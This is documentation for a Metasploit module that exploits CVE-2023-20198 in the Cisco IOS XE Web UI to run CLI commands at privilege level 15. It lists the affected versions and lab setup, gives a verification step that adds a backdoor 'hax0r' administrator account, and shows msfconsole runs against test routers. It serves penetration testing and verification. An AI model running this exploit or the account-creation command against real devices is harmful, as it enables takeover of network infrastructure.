## Vulnerable Application
This module leverages CVE-2023-20198 against vulnerable instances of Cisco IOS XE devices which have the
Web UI exposed. An attacker can execute arbitrary CLI commands with privilege level 15.

You must specify the IOS command mode to execute a CLI command in. Valid modes are `user`, `privileged`, and
`global`. To run a command in "Privileged" mode, set the `CMD` option to the command you want to run,
e.g. `show version` and set the `MODE` to `privileged`.  To run a command in "Global Configuration" mode, set
the `CMD` option to the command you want to run,  e.g. `username hax0r privilege 15 password hax0r` and set
the `MODE` to `global`.

The vulnerable IOS XE versions are:

16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,
16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,
16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,
16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,
16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,
16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,
16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,
16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,
16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,
16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,
16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,
16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,
16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,
17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,
17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,
17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,
17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,
17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,
17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,
17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,
17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,
17.11.99SW

## Testing
This module was tested against the following IOS XE versions:

| IOS XE Version | Appliance Series |
|----------------|------------------|
| 16.12.3        | CSR1000v         |
| 17.03.02       | CSR1000v         |
| 17.06.05       | C8000v           |

To test this module you will need to either:

* Acquire a hardware device running one of the vulnerable firmware versions listed above.

Or

* Setup a virtualized environment.
  * A [CSR1000V](https://www.cisco.com/c/en/us/products/routers/cloud-services-router-1000v-series/index.html) device
    can be virtualized using [GNS3](https://www.gns3.com/) and VMWare Workstation/Player. Follow the
    [Windows setup guide](https://docs.gns3.com/docs/getting-started/installation/windows) to install GNS3 and the
    [topology guide](https://docs.gns3.com/docs/getting-started/your-first-gns3-topology) to learn how GNS3 can be used.
  * A suitable firmware image for testing would be `csr1000v-universalk9.16.12.03-serial.qcow2`.
  * When setting up GNS3, run the `GNS3 2.2.43` Virtual Machine for deploying QEMU based devices.
  * Create a new CSR1000v instance as a QEMU device.
  * The CSR1000v device's first ethernet adapter `Gi1` should be connected to a Cloud device, whose adapter was bridged
    to the physical adapter on the host machine, allowing an IP address to be assigned via DHCP, and allowing the Web UI to
    be accessible to a remote attacker.
  * When the virtual router has booted up, you must enable the vulnerable WebUI component. From a serial console on
    the device:
    ```
    Router>enable
    Router#config
    Router(config)#ip http server
    router(config)#ip http secure-server
    router(config)#ip http authentication local
    router(config)#username admin privilege 15 secret qwerty
    router(config)#exit
    Router#copy running-config startup-config
    ```
  * You should now be able to access the WebUI via https://TARGET_IP_ADDRESS/webui and login with admin:qwerty

## Verification Steps
1. Start msfconsole
2. `use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set CMD "username hax0r privilege 15 secret hax0r"`
5. `set MODE global`
6. `run`
7. Visit `https://<TARGET_IP_ADDRESS>/webui/` in a browser and log in with username `hax0r` and password `hax0r`.

## Options

### CMD

The Cisco CLI command to execute.

### MODE
Cisco IOS commands cna be executed in one of several modes, specifically "User EXEC" mode, "Privileged EXEC" mode, and 
"Global Configuration" mode. The `MODE` options lets you explicitly set what mode you want the `CMD` to execute in. Valid
modes are `user`, `privileged`, and `global`.

## Scenarios

### IOS XE 16.12.03 (CSR1000v)
```
msf6 > use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set RHOST 192.168.86.57
RHOST => 192.168.86.57
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set CMD "show version"
CMD => show version
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set MODE privileged
MODE => privileged
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options

Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      show version     yes       The CLI command to execute.
   MODE     privileged       yes       The mode to execute the CLI command in, valid values are 'user', 'privileged', or 'global'.
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.86.57    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
[*] Running module against 192.168.86.57


Cisco IOS XE Software, Version 16.12.03
Cisco IOS Software [Gibraltar], Virtual XE Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.12.3, RELEASE SOFTWARE (fc5)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2020 by Cisco Systems, Inc.
Compiled Mon 09-Mar-20 21:50 by mcpre
Cisco IOS-XE software, Copyright (c) 2005-2020 by cisco Systems, Inc.
All rights reserved.  Certain components of Cisco IOS-XE software are
licensed under the GNU General Public License ("GPL") Version 2.0.  The
software code licensed under GPL Version 2.0 is free software that comes
with ABSOLUTELY NO WARRANTY.  You can redistribute and/or modify such
GPL code under the terms of GPL Version 2.0.  For more details, see the
documentation or "License Notice" file accompanying the IOS-XE software,
or the applicable URL provided on the flyer accompanying the IOS-XE
software.
ROM: IOS-XE ROMMON
router uptime is 3 hours, 59 minutes
Uptime for this control processor is 4 hours, 2 minutes
System returned to ROM by reload
System image file is "bootflash:packages.conf"
Last reload reason: reload
This product contains cryptographic features and is subject to United
States and local country laws governing import, export, transfer and
use. Delivery of Cisco cryptographic products does not imply
third-party authority to import, export, distribute or use encryption.
Importers, exporters, distributors and users are responsible for
compliance with U.S. and local country laws. By using this product you
agree to comply with applicable laws and regulations. If you are unable
to comply with U.S. and local laws, return this product immediately.
A summary of U.S. laws governing Cisco cryptographic products may be found at:
http://www.cisco.com/wwl/export/crypto/tool/stqrg.html
If you require further assistance please contact us by sending email to
export@cisco.com.
License Level: ax
License Type: N/A(Smart License Enabled)
Next reload license Level: ax
Smart Licensing Status: UNREGISTERED/No Licenses in Use
cisco CSR1000V (VXE) processor (revision VXE) with 1113574K/3075K bytes of memory.
Processor board ID 9OVFUOGPESO
4 Gigabit Ethernet interfaces
32768K bytes of non-volatile configuration memory.
3012164K bytes of physical memory.
6188032K bytes of virtual hard disk at bootflash:.
0K bytes of WebUI ODM Files at webui:.
Configuration register is 0x2102

[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
[*] Running module against 192.168.86.57


*15:24:05.110 UTC Fri Nov 3 2023
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
```

### IOS XE 17.06.05 (C8000v)

```
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options 

Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      show version     yes       The CLI command to execute.
   MODE     privileged       yes       The mode to execute the CLI command in, valid values are 'user', 'privileged', or 'global'.
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.86.108   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
[*] Running module against 192.168.86.108

Cisco IOS XE Software, Version 17.06.05
Cisco IOS Software [Bengaluru], Virtual XE Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 17.6.5, RELEASE SOFTWARE (fc2)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2023 by Cisco Systems, Inc.
Compiled Wed 25-Jan-23 16:07 by mcpre
Cisco IOS-XE software, Copyright (c) 2005-2023 by cisco Systems, Inc.
All rights reserved.  Certain components of Cisco IOS-XE software are
licensed under the GNU General Public License ("GPL") Version 2.0.  The
software code licensed under GPL Version 2.0 is free software that comes
with ABSOLUTELY NO WARRANTY.  You can redistribute and/or modify such
GPL code under the terms of GPL Version 2.0.  For more details, see the
documentation or "License Notice" file accompanying the IOS-XE software,
or the applicable URL provided on the flyer accompanying the IOS-XE
software.
ROM: IOS-XE ROMMON
test_c800v uptime is 1 hour, 43 minutes
Uptime for this control processor is 1 hour, 44 minutes
System returned to ROM by reload
System image file is "bootflash:packages.conf"
Last reload reason: reload
This product contains cryptographic features and is subject to United
States and local country laws governing import, export, transfer and
use. Delivery of Cisco cryptographic products does not imply
third-party authority to import, export, distribute or use encryption.
Importers, exporters, distributors and users are responsible for
compliance with U.S. and local country laws. By using this product you
agree to comply with applicable laws and regulations. If you are unable
to comply with U.S. and local laws, return this product immediately.
A summary of U.S. laws governing Cisco cryptographic products may be found at:
http://www.cisco.com/wwl/export/crypto/tool/stqrg.html
If you require further assistance please contact us by sending email to
export@cisco.com.
License Level: 
License Type: Perpetual
Next reload license Level: 
Addon License Level: 
Addon License Type: Subscription
Next reload addon license Level: 
The current throughput level is 10000 kbps 
Smart Licensing Status: Registration Not Applicable/Not Applicable
cisco C8000V (VXE) processor (revision VXE) with 2027875K/3075K bytes of memory.
Processor board ID 9VM6T5CQNTE
Router operating mode: Autonomous
3 Gigabit Ethernet interfaces
32768K bytes of non-volatile configuration memory.
3965316K bytes of physical memory.
11526144K bytes of virtual hard disk at bootflash:.
Configuration register is 0x2102

[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
[*] Running module against 192.168.86.108

*17:36:50.722 UTC Mon Mar 3 2025
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
```